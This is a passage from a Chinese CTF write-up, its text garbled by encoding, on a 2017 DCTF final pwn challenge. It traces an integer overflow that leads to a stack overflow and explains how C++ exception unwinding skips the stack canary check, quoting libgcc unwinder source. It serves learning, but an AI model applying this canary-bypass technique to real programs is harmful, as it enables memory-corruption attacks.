href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-04.jpg"></a></p><p>ç»“æ„åŒ–å†™å…¥ï¼Œä½†æ˜¯é¢˜ç›®å¼€å¯äº†canary æ²¡æ³•ç»•è¿‡</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-05.jpg"></a></p><p>3.å †æº¢å‡º<br>ä»…ä»…ä¸€æ¬¡æº¢å‡ºæ— è¿”å›ï¼Œæˆ‘æ²¡æƒ³åˆ°æ–¹æ³•</p><p>ä½†æ˜¯ç”±äºä¸Šè¿°åŸå› ä¸‰ä¸ªæ²¡æ³•å®Œæ•´åˆ©ç”¨èµ·æ¥ï¼Œå¦‚æœé˜…è¯»åˆ°è¿™ç¯‡æ–‡ç« åˆ°ä½ ï¼Œæœ‰åˆ©ç”¨æ–¹æ³•æˆ–è€…åˆ©ç”¨æ€è·¯è¯·é‚®ä»¶å‘ŠçŸ¥æˆ‘ã€‚</p><p>åœ¨å†³èµ›ç°åœºæŠŠæ—¶é—´éƒ½åœ¨è€—åœ¨äº†è¿™ä¸ªå‡½æ•°é‡Œäº†ï¼Œç°åœ¨æƒ³æƒ³ä¼°è®¡è¿›äº†ä¸€ä¸ªå¤§å‘å§ã€‚</p><h3 id="è½¬æœº"><a href="#è½¬æœº" class="headerlink" title="è½¬æœº"></a>è½¬æœº</h3><p>æ¯”èµ›ç»“æŸåï¼Œè¿˜æ˜¯æ„Ÿè§‰å¿ƒé‡Œå µå µçš„ï¼Œå¿ƒæƒ³ï¼Œæ¯”èµ›ä¹Ÿä¸å•å•æ˜¯æ¯”èµ›å§ï¼Œé‡åˆ°äº†é—®é¢˜æ€»ä¸å»è§£å†³æ€»è¿˜æœ‰ä¼šé‡åˆ°çš„ï¼Œæ¯”èµ›ç»“æŸåçš„å‡ å¤©ï¼Œæˆ‘æ‹¿åˆ°äº†é¢˜ç›®çš„expï¼Œäºæ˜¯å¼€å§‹äº†è°ƒè¯•ä¹‹æ—…ã€‚</p><p>é¢˜ç›®çš„å…³é”®åœ¨ç¬¬ä¸€ä¸ªå‡½æ•°é‡Œï¼Œ<strong>start flexmdt</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-06.jpg"></a></p><p>æˆ‘ä»¬ä»”ç»†çœ‹è¿™ä¸ªå‡½æ•°çš„æµç¨‹ï¼Œé¦–å…ˆç¨‹åºé‡Œè¿›è¡Œäº†ä¸€ä¸ªå¼‚å¸¸æ•æ‰æœºåˆ¶ï¼Œåœ¨ä¼ªä»£ç ä¸­ï¼Œè¿™ä¸ªtryç»“æ„å¹¶æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    sub_401148();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">int</span> *_ZTIi)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨**sub_401148()**è¿™ä¸ªå‡½æ•°é‡Œé¢<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-07.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-07.jpg"></a></p><p>å…¶å®æ˜¯èƒ½æ³¨æ„åˆ°ä¸€ä¸ªæ•´å‹æº¢å‡ºçš„æ¼æ´<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg"></a></p><p>å¯¹è¾“å…¥åŠ ä¸€åè¿›è¡Œæ— ç¬¦å·æ•´å‹å¼ºåˆ¶è½¬æ¢</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg"></a><br>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å‘ç°è¿™é‡Œå°±å­˜åœ¨äº†ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´â€¦è¯»å–çš„s1æ˜¯åœ¨æ ˆä¸Šçš„</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-09.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-09.jpg"></a></p><p>ä½†æ˜¯åˆå›åˆ°äº†ä¸€å¼€å§‹çš„é—®é¢˜ï¼Œå¦‚ä½•ç»•è¿‡canary?</p><h2 id="C-å¼‚å¸¸æœºåˆ¶"><a href="#C-å¼‚å¸¸æœºåˆ¶" class="headerlink" title="C++å¼‚å¸¸æœºåˆ¶"></a>C++å¼‚å¸¸æœºåˆ¶</h2><p>äºæ˜¯ï¼Œæˆ‘ä»¬å¼€å§‹å»ç ”ç©¶**sub_400F8F()**å‡½æ•°å‘¨å›´å­˜åœ¨çš„å¼‚å¸¸æœºåˆ¶</p><h3 id="C-å‡½æ•°çš„è°ƒç”¨å’Œè¿”å›"><a href="#C-å‡½æ•°çš„è°ƒç”¨å’Œè¿”å›" class="headerlink" title="C++ å‡½æ•°çš„è°ƒç”¨å’Œè¿”å›"></a>C++ å‡½æ•°çš„è°ƒç”¨å’Œè¿”å›</h3><p>é¦–å…ˆå¼‚å¸¸æœºåˆ¶ä¸­æœ€é‡è¦çš„ä¸‰ä¸ªå…³é”®å­—å°±æ˜¯ï¼šthrow   try   catchï¼ŒThrowæŠ›å‡ºå¼‚å¸¸ï¼Œtry åŒ…å«å¼‚å¸¸æ¨¡å—ï¼Œcatch æ•æ‰æŠ›å‡ºçš„å¼‚å¸¸ï¼Œä¸‰è€…å„æœ‰å„çš„åˆ†å·¥ï¼Œé›†æˆåœ¨ä¸€èµ·å°±æ„æˆäº†å¼‚å¸¸çš„åŸºæœ¬æœºåˆ¶</p><p>é¦–å…ˆæ¾„æ¸…ä¸€ç‚¹ï¼Œè¿™é‡Œè¯´çš„ â€œC++ å‡½æ•°â€æ˜¯æŒ‡ï¼š<br>1.è¯¥å‡½æ•°å¯èƒ½ä¼šç›´æ¥æˆ–é—´æ¥åœ°æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼šå³è¯¥å‡½æ•°çš„å®šä¹‰å­˜æ”¾åœ¨ä¸€ä¸ª C++ ç¼–è¯‘ï¼ˆè€Œä¸æ˜¯ä¼ ç»Ÿ Cï¼‰å•å…ƒå†…ï¼Œå¹¶ä¸”è¯¥å‡½æ•°æ²¡æœ‰ä½¿ç”¨â€œthrow()â€å¼‚å¸¸è¿‡æ»¤å™¨ã€‚<br>2.è¯¥å‡½æ•°çš„å®šä¹‰å†…ä½¿ç”¨äº† try å—ã€‚<br>åªéœ€è¦æ»¡è¶³ä¸€ç‚¹å³å¯ï¼Œ</p><h3 id="å¼‚å¸¸æŠ›å‡º"><a href="#å¼‚å¸¸æŠ›å‡º" class="headerlink" title="å¼‚å¸¸æŠ›å‡º"></a>å¼‚å¸¸æŠ›å‡º</h3><p>åœ¨ç¼–è¯‘ä¸€æ®µ C++ ä»£ç æ—¶ï¼Œç¼–è¯‘å™¨ä¼šå°†æ‰€æœ‰ throw è¯­å¥æ›¿æ¢ä¸ºå…¶ C++ è¿è¡Œæ—¶åº“ä¸­çš„æŸä¸€æŒ‡å®šå‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬å«å®ƒ __CxxRTThrowExpï¼ˆä¸æœ¬æ–‡æåˆ°çš„æ‰€æœ‰å…¶å®ƒæ•°æ®ç»“æ„å’Œå±æ€§åä¸€æ ·ï¼Œåœ¨å®é™…åº”ç”¨ä¸­å®ƒå¯ä»¥æ˜¯ä»»æ„åç§°ï¼‰ã€‚è¯¥å‡½æ•°æ¥æ”¶ä¸€ä¸ªç¼–è¯‘å™¨è®¤å¯çš„å†…éƒ¨ç»“æ„ï¼ˆæˆ‘ä»¬å«å®ƒ EXCEPTION ç»“æ„ï¼‰ã€‚è¿™ä¸ªç»“æ„ä¸­åŒ…å«äº†å¾…æŠ›å‡ºå¼‚å¸¸å¯¹è±¡çš„èµ·å§‹åœ°å€ã€ç”¨äºé”€æ¯å®ƒçš„ææ„å‡½æ•°ï¼Œä»¥åŠå®ƒçš„ type_info ä¿¡æ¯ã€‚å¯¹äºæ²¡æœ‰å¯ç”¨ RTTI æœºåˆ¶ï¼ˆç¼–è¯‘å™¨ç¦ç”¨äº† RTTI æœºåˆ¶æˆ–æ²¡æœ‰åœ¨ç±»å±‚æ¬¡ç»“æ„ä¸­ä½¿ç”¨è™šè¡¨ï¼‰çš„å¼‚å¸¸ç±»å±‚æ¬¡ç»“æ„ï¼Œå¯èƒ½è¿˜è¦åŒ…å«å…¶æ‰€æœ‰åŸºç±»çš„ type_info ä¿¡æ¯ï¼Œä»¥ä¾¿ä¸ç›¸åº”çš„ catch å—è¿›è¡ŒåŒ¹é…ã€‚</p><p>__CxxRTThrowExp é¦–å…ˆæ¥æ”¶ï¼ˆå¹¶ä¿å­˜ï¼‰EXCEPTION å¯¹è±¡ï¼›ç„¶åä» TLSï¼šCurrent ExpHdl å¤„æ‰¾åˆ°ä¸å½“å‰å‡½æ•°å¯¹åº”çš„ piHandlerã€nStep ç­‰å¼‚å¸¸å¤„ç†ç›¸å…³æ•°æ®ï¼›å¹¶æŒ‰ç…§å‰æ–‡æ‰€è¿°çš„æœºåˆ¶å®Œæˆå¼‚å¸¸æ•è·å’Œæ ˆå›é€€ã€‚ç”±æ­¤å®Œæˆäº†åŒ…æ‹¬â€œæŠ›å‡ºâ€-&gt;â€œæ•è·â€-&gt;â€œå›é€€â€ç­‰æ­¥éª¤çš„æ•´å¥—å¼‚å¸¸å¤„ç†æœºåˆ¶ã€‚</p><h3 id="å¼‚å¸¸æ•è·æœºåˆ¶"><a href="#å¼‚å¸¸æ•è·æœºåˆ¶" class="headerlink" title="å¼‚å¸¸æ•è·æœºåˆ¶"></a>å¼‚å¸¸æ•è·æœºåˆ¶</h3><p>ä¸€ä¸ªå¼‚å¸¸è¢«æŠ›å‡ºæ—¶ï¼Œå°±ä¼šç«‹å³å¼•å‘ C++ çš„å¼‚å¸¸æ•è·æœºåˆ¶ï¼š<br>æ ¹æ® c++ çš„æ ‡å‡†ï¼Œå¼‚å¸¸æŠ›å‡ºåå¦‚æœåœ¨å½“å‰å‡½æ•°å†…æ²¡æœ‰è¢«æ•æ‰(catch)ï¼Œå®ƒå°±è¦æ²¿ç€å‡½æ•°çš„è°ƒç”¨é“¾ç»§ç»­å¾€ä¸ŠæŠ›ï¼Œç›´åˆ°èµ°å®Œæ•´ä¸ªè°ƒç”¨é“¾ï¼Œæˆ–è€…åœ¨æŸä¸ªå‡½æ•°ä¸­æ‰¾åˆ°ç›¸åº”çš„ catchã€‚å¦‚æœèµ°å®Œè°ƒç”¨é“¾éƒ½æ²¡æœ‰æ‰¾åˆ°ç›¸åº”çš„ catchï¼Œé‚£ä¹ˆstd::terminate() å°±ä¼šè¢«è°ƒç”¨ï¼Œè¿™ä¸ªå‡½æ•°é»˜è®¤æ˜¯æŠŠç¨‹åº abortï¼Œè€Œå¦‚æœæœ€åæ‰¾åˆ°äº†ç›¸åº”çš„ catchï¼Œå°±ä¼šè¿›å…¥è¯¥ catch ä»£ç å—ï¼Œæ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚</p><p>ç¨‹åºä¸­çš„ catch é‚£éƒ¨åˆ†ä»£ç æœ‰ä¸€ä¸ªä¸“é—¨çš„åå­—å«ä½œï¼šLanding padï¼ˆä¸ååˆ†å‡†ç¡®ï¼‰ï¼Œä»æŠ›å¼‚å¸¸å¼€å§‹åˆ°æ‰§è¡Œ landing pad é‡Œçš„ä»£ç è¿™ä¸­é—´çš„æ•´ä¸ªè¿‡ç¨‹å«ä½œ stack unwindï¼Œè¿™ä¸ªè¿‡ç¨‹åŒ…å«äº†ä¸¤ä¸ªé˜¶æ®µï¼š<br>1ï¼‰ä»æŠ›å¼‚å¸¸çš„å‡½æ•°å¼€å§‹ï¼Œå¯¹è°ƒç”¨é“¾ä¸Šçš„å‡½æ•°é€ä¸ªå¾€å‰æŸ¥æ‰¾ landing padã€‚</p><p>2ï¼‰å¦‚æœæ²¡æœ‰æ‰¾åˆ° landing pad åˆ™æŠŠç¨‹åº abortï¼Œå¦åˆ™ï¼Œåˆ™è®°ä¸‹ landing pad çš„ä½ç½®ï¼Œå†é‡æ–°å›åˆ°æŠ›å¼‚å¸¸çš„å‡½æ•°é‚£é‡Œå¼€å§‹ï¼Œä¸€å¸§ä¸€å¸§åœ°æ¸…ç†è°ƒç”¨é“¾ä¸Šå„ä¸ªå‡½æ•°å†…éƒ¨çš„å±€éƒ¨å˜é‡ï¼Œç›´åˆ° landing pad æ‰€åœ¨çš„å‡½æ•°ä¸ºæ­¢ã€‚</p><p>ä¸ºäº†èƒ½å¤ŸæˆåŠŸåœ°æ•è·å¼‚å¸¸å’Œæ­£ç¡®åœ°å®Œæˆæ ˆå›é€€ï¼ˆstack unwindï¼‰</p><h3 id="æ ˆå›é€€ï¼ˆStack-Unwindï¼‰æœºåˆ¶"><a href="#æ ˆå›é€€ï¼ˆStack-Unwindï¼‰æœºåˆ¶" class="headerlink" title="æ ˆå›é€€ï¼ˆStack Unwindï¼‰æœºåˆ¶"></a>æ ˆå›é€€ï¼ˆStack Unwindï¼‰æœºåˆ¶</h3><p>â€œå›é€€â€æ˜¯ä¼´éšå¼‚å¸¸å¤„ç†æœºåˆ¶å¼•å…¥ C++ ä¸­çš„ä¸€ä¸ªæ–°æ¦‚å¿µï¼Œä¸»è¦ç”¨æ¥ç¡®ä¿åœ¨å¼‚å¸¸è¢«æŠ›å‡ºã€æ•è·å¹¶å¤„ç†åï¼Œæ‰€æœ‰ç”Ÿå‘½æœŸå·²ç»“æŸçš„å¯¹è±¡éƒ½ä¼šè¢«æ­£ç¡®åœ°ææ„ï¼Œå®ƒä»¬æ‰€å ç”¨çš„ç©ºé—´ä¼šè¢«æ­£ç¡®åœ°å›æ”¶ã€‚</p><h3 id="æ€»ç»“ä¸‹è¿‡ç¨‹"><a href="#æ€»ç»“ä¸‹è¿‡ç¨‹" class="headerlink" title="æ€»ç»“ä¸‹è¿‡ç¨‹"></a>æ€»ç»“ä¸‹è¿‡ç¨‹</h3><p>åœ¨è°ƒè¯•çš„ç¨‹åºçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå‘ç°ï¼Œå¼‚å¸¸å¯¹è±¡ç”±å‡½æ•° <strong>cxa_allocate_exception() è¿›è¡Œåˆ›å»ºï¼Œæœ€åç”± __cxa_free_exception() è¿›è¡Œé”€æ¯ã€‚å½“æˆ‘ä»¬åœ¨ç¨‹åºé‡Œæ‰§è¡Œäº†æŠ›å‡ºå¼‚å¸¸åï¼Œç¼–è¯‘å™¨ä¸ºæˆ‘ä»¬åšäº†å¦‚ä¸‹çš„äº‹æƒ…ï¼š<br>1ï¼‰è°ƒç”¨ __cxa_allocate_exception å‡½æ•°ï¼Œåˆ†é…ä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ã€‚</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-10.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-10.jpg"></a></p><p>2ï¼‰è°ƒç”¨ __cxa_throw å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå°†å¼‚å¸¸å¯¹è±¡åšä¸€äº›åˆå§‹åŒ–__</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-11.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-11.jpg"></a></p><p>3ï¼‰__cxa_throw() è°ƒç”¨ Itanium ABI é‡Œçš„ _Unwind_RaiseException() ä»è€Œå¼€å§‹ unwindã€‚</p><p>4ï¼‰_Unwind_RaiseException() å¯¹è°ƒç”¨é“¾ä¸Šçš„å‡½æ•°è¿›è¡Œ unwind æ—¶ï¼Œè°ƒç”¨ personality routineã€‚</p><p>5ï¼‰å¦‚æœè¯¥å¼‚å¸¸å¦‚èƒ½è¢«å¤„ç†(æœ‰ç›¸åº”çš„ catch)ï¼Œåˆ™ personality routine ä¼šä¾æ¬¡å¯¹è°ƒç”¨é“¾ä¸Šçš„å‡½æ•°è¿›è¡Œæ¸…ç†ã€‚</p><p>6ï¼‰_Unwind_RaiseException() å°†æ§åˆ¶æƒè½¬åˆ°ç›¸åº”çš„catchä»£ç ã€‚<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-12.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-12.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-13.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-13.jpg"></a></p><ol start="7"><li>unwind å®Œæˆï¼Œç”¨æˆ·ä»£ç ç»§ç»­æ‰§è¡Œã€‚</li></ol><p>ç„¶åæˆ‘ä»¬å¾ˆæƒŠè®¶çš„å‘ç°ï¼Œç¨‹åºè·³è¿‡äº†canaryæ£€æŸ¥çš„ç¯èŠ‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-14.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-14.jpg"></a></p><p>è¿™å¾ˆè®©æˆ‘å¥½å¥‡â€¦unwindçš„æ—¶å€™æ˜¯ä¸æ˜¯å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</p><h3 id="unwindçš„åšäº†ä»€ä¹ˆï¼Ÿ"><a href="#unwindçš„åšäº†ä»€ä¹ˆï¼Ÿ" class="headerlink" title="unwindçš„åšäº†ä»€ä¹ˆï¼Ÿ"></a>unwindçš„åšäº†ä»€ä¹ˆï¼Ÿ</h3><p>unwind çš„è¿‡ç¨‹æ˜¯ä» __cxa_throw() é‡Œå¼€å§‹çš„ï¼Œè¯·çœ‹å¦‚ä¸‹æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="keyword">void</span></span><br><span class="line">__cxxabiv1::__cxa_throw (<span class="keyword">void</span> *obj, <span class="built_in">std</span>::type_info *tinfo,</span><br><span class="line"><span class="keyword">void</span> (_GLIBCXX_CDTOR_CALLABI *dest) (<span class="keyword">void</span> *))</span><br><span class="line">&#123;</span><br><span class="line">   PROBE2 (<span class="keyword">throw</span>, obj, tinfo);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Definitely a primary.</span></span><br><span class="line">   __cxa_refcounted_exception *header = __get_refcounted_exception_header_from_obj (obj);</span><br><span class="line">   header-&gt;referenceCount = <span class="number">1</span>;</span><br><span class="line">   header-&gt;exc.exceptionType = tinfo;</span><br><span class="line">   header-&gt;exc.exceptionDestructor = dest;</span><br><span class="line">   header-&gt;exc.unexpectedHandler = <span class="built_in">std</span>::get_unexpected ();</span><br><span class="line">   header-&gt;exc.terminateHandler = <span class="built_in">std</span>::get_terminate ();</span><br><span class="line">   __GXX_INIT_PRIMARY_EXCEPTION_CLASS(header-&gt;exc.unwindHeader.exception_class);</span><br><span class="line">   header-&gt;exc.unwindHeader.exception_cleanup = __gxx_exception_cleanup;</span><br><span class="line"></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">ifdef</span> _GLIBCXX_SJLJ_EXCEPTIONS</span></span><br><span class="line">   _Unwind_SjLj_RaiseException (&amp;header-&gt;exc.unwindHeader);</span><br><span class="line">   <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">   _Unwind_RaiseException (&amp;header-&gt;exc.unwindHeader);</span><br><span class="line">   <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Some sort of unwinding error. Note that terminate is a handler.</span></span><br><span class="line">   __cxa_begin_catch (&amp;header-&gt;exc.unwindHeader);</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">terminate</span> ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° __cxa_throw æœ€ç»ˆè°ƒç”¨äº† _Unwind_RaiseException()ï¼Œstack unwind å°±æ­¤å¼€å§‹ï¼Œå¦‚å‰é¢æ‰€è¯´ï¼Œunwind åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œåˆ†åˆ«è¿›è¡Œæœç´¢ catch åŠæ¸…ç†è°ƒç”¨æ ˆï¼Œå…¶ç›¸åº”çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Raise an exception, passing along the given exception object.  */</span></span><br><span class="line"></span><br><span class="line">_Unwind_Reason_Code</span><br><span class="line">_Unwind_RaiseException(struct _Unwind_Exception *exc)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Context</span> <span class="title">this_context</span>, <span class="title">cur_context</span>;</span></span><br><span class="line">  _Unwind_Reason_Code code;</span><br><span class="line"></span><br><span class="line">  uw_init_context (&amp;this_context);</span><br><span class="line">  cur_context = this_context;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Phase 1: Search.  Unwind the stack, calling the personality routine</span></span><br><span class="line"><span class="comment">     with the _UA_SEARCH_PHASE flag set.  Do not modify the stack yet.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _Unwind_FrameState fs;</span><br><span class="line"></span><br><span class="line">      code = uw_frame_state_for (&amp;cur_context, &amp;fs);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (code == _URC_END_OF_STACK)</span><br><span class="line">    <span class="comment">/* Hit end of stack with no handler found.  */</span></span><br><span class="line">    <span class="keyword">return</span> _URC_END_OF_STACK;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (code != _URC_NO_REASON)</span><br><span class="line">    <span class="comment">/* Some error encountered.  Ususally the unwinder doesn&#x27;t</span></span><br><span class="line"><span class="comment">       diagnose these and merely crashes.  */</span></span><br><span class="line">    <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fs.personality)</span><br><span class="line">    &#123;</span><br><span class="line">      code = (*fs.personality) (<span class="number">1</span>, _UA_SEARCH_PHASE, exc-&gt;exception_class,</span><br><span class="line">                    exc, &amp;cur_context);</span><br><span class="line">      <span class="keyword">if</span> (code == _URC_HANDLER_FOUND)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND)</span><br><span class="line">        <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      uw_update_context (&amp;cur_context, &amp;fs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Indicate to _Unwind_Resume and associated subroutines that this</span></span><br><span class="line"><span class="comment">     is not a forced unwind.  Further, note where we found a handler.  */</span></span><br><span class="line">  exc-&gt;private_1 = <span class="number">0</span>;</span><br><span class="line">  exc-&gt;private_2 = uw_identify_context (&amp;cur_context);</span><br><span class="line"></span><br><span class="line">  cur_context = this_context;</span><br><span class="line">  code = _Unwind_RaiseException_Phase2 (exc, &amp;cur_context);</span><br><span class="line">  <span class="keyword">if</span> (code != _URC_INSTALL_CONTEXT)</span><br><span class="line">    <span class="keyword">return</span> code;</span><br><span class="line"></span><br><span class="line">  uw_install_context (&amp;this_context, &amp;cur_context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> _Unwind_Reason_Code</span><br><span class="line">_Unwind_RaiseException_Phase2(struct _Unwind_Exception *exc,</span><br><span class="line">                  struct _Unwind_Context *context)</span><br><span class="line">&#123;</span><br><span class="line">  _Unwind_Reason_Code code;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _Unwind_FrameState fs;</span><br><span class="line">      <span class="keyword">int</span> match_handler;</span><br><span class="line"></span><br><span class="line">      code = uw_frame_state_for (context, &amp;fs);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Identify when we&#x27;ve reached the designated handler context.  */</span></span><br><span class="line">      match_handler = (uw_identify_context (context) == exc-&gt;private_2</span><br><span class="line">               ? _UA_HANDLER_FRAME : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (code != _URC_NO_REASON)</span><br><span class="line">    <span class="comment">/* Some error encountered.  Usually the unwinder doesn&#x27;t</span></span><br><span class="line"><span class="comment">       diagnose these and merely crashes.  */</span></span><br><span class="line">      <span class="keyword">return</span> _URC_FATAL_PHASE2_ERROR;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fs.personality)</span><br><span class="line">      &#123;</span><br><span class="line">        code = (*fs.personality) (<span class="number">1</span>, _UA_CLEANUP_PHASE | match_handler,</span><br><span class="line">                    exc-&gt;exception_class, exc, context);</span><br><span class="line">        <span class="keyword">if</span> (code == _URC_INSTALL_CONTEXT)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND) </span><br><span class="line">          <span class="keyword">return</span> _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Don&#x27;t let us unwind past the handler context.  */</span></span><br><span class="line">      <span class="keyword">if</span> (match_handler)</span><br><span 